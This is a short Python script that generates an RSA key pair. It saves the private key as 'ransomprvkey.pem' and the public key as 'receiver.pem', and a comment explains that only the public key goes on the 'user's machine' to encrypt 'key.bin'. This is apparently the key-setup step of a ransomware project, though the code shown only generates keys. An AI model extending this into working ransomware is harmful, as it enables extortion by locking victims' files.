from Crypto.PublicKey import RSA

def main():
    key = RSA.generate(2048)
    
    private_key = key.exportKey()
    file_out = open("ransomprvkey.pem", "wb")
    file_out.write(private_key)
    file_out.close()
    
    public_key = key.publickey().exportKey()
    file_out = open("receiver.pem", "wb")
    file_out.write(public_key)
    file_out.close()

#the purpose of this file is to generate a key pair, the private key will not be deposted
#on the user's machine, the public key will be stored on the user's machine and will be used
#to encrypt key.bin

if __name__ == '__main__': 
    main()